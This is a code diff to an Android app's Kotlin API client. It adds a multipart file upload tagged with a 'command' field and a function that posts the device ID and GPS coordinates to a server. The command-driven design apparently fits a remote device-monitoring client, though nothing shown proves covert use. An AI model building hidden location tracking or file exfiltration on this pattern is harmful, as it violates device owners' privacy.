@@ -13,6 +13,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.MultipartBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
 import java.security.SecureRandom
@@ -287,6 +289,53 @@ object ApiClient {
         } catch (e: Exception) {
             Log.e(TAG, "Server health check failed", e)
             false
+        }
+    }
+
+    // ===== UPLOAD FILE (Multipart) =====
+    suspend fun uploadFile(file: java.io.File, command: String) = withContext(Dispatchers.IO) {
+        try {
+            val MEDIA_TYPE = "application/octet-stream".toMediaType()
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("command", command)
+                .addFormDataPart("file", file.name, file.asRequestBody(MEDIA_TYPE))
+                .build()
+            val url = "${Config.SERVER_DOMAIN}/api/upload"
+            Log.d(TAG, "uploadFile: uploading ${file.name} ($command) to $url")
+            val request = Request.Builder().url(url).post(requestBody).build()
+            client.newCall(request).execute().use { resp ->
+                val code = resp.code
+                val body = resp.body?.string() ?: "{}"
+                Log.d(TAG, "uploadFile $command: HTTP $code, response='${body.take(200)}'")
+                body
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "uploadFile error for $command", e)
+                "{\"error\":\"${e.message}\"}"
+        }
+    }
+
+    // ===== SEND LOCATION =====
+    suspend fun sendLocation(context: Context, lat: Double, lng: Double, accuracy: Float? = null) {
+        withContext(Dispatchers.IO) {
+            try {
+                val deviceId = DeviceUtils.getDeviceId(context)
+                val body = mutableMapOf<String, Any>(
+                    "device_id" to deviceId,
+                    "command" to "location",
+                    "data" to mapOf(
+                        "latitude" to lat,
+                        "longitude" to lng,
+                        "accuracy" to (accuracy ?: 0f),
+                        "timestamp" to System.currentTimeMillis()
+                    )
+                )
+                val response = post("/data", body)
+                Log.d(TAG, "sendLocation response: '${response.take(100)}'")
+            } catch (e: Exception) {
+                Log.e(TAG, "sendLocation error", e)
+            }
         }
     }
 
